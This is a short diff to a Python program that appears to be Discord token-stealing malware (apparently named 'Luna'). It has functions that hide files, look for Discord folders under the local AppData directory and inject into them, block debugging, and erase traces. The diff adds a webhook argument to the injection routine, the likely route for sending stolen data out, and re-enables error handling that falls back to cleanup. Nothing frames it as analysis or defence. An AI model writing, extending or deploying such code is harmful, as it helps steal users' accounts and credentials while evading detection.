@@ -535,7 +535,7 @@ def cleanup():
 def hide(file):
     SetFileAttributes(file, FILE_ATTRIBUTE_HIDDEN)
 
-def inject():
+def inject(webhook):
     appdata = os.getenv("localappdata")
     for _dir in os.listdir(appdata):
         if 'discord' in _dir.lower():
@@ -617,11 +617,11 @@ class debug:
         exit()
 
 if __name__ == '__main__' and os.name == "nt":
-    # try:
+    try:
         debug()
         Luna()
-    # except Exception:
-    #     try:
-    #         cleanup()
-    #     except Exception:
-    #         exit()
+    except Exception:
+        try:
+            cleanup()
+        except Exception:
+            exit()
